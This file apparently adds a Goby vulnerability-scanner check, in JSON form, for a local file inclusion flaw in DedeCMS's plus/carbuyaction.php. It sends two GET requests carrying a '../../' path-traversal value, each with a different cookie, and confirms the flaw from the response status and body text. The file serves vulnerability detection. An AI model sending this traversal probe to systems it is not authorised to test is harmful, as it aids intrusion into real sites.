@@ -1,0 +1,93 @@
+{
+      "Name": "DedeCMS Carbuyaction FileInclude",
+      "Level": "2",
+      "Tags": [
+            "FileInclude"
+      ],
+      "GobyQuery": "app=\"DedeCMS\"",
+      "Description": "DedeCMS Carbuyaction.php页面存在本地文件包含漏洞",
+      "Product": "DedeCMS",
+      "Homepage": "http://www.dedecms.com/",
+      "Author": "aetkrad",
+      "Impact": "",
+      "Recommendation": "",
+      "References": [
+            "https://www.cnblogs.com/milantgh/p/3615986.html"
+      ],
+      "HasExp": false,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/plus/carbuyaction.php?dopost=return&code=../../",
+                        "follow_redirect": true,
+                        "header": {
+                              "Cookie": "code=alipay"
+                        },
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/plus/carbuyaction.php?dopost=return&code=../../",
+                        "follow_redirect": true,
+                        "header": {
+                              "Cookie": "code=cod"
+                        },
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "Cod::respond()",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "PostTime": "2021-11-13 14:18:50",
+      "GobyVersion": "1.8.302"
+}
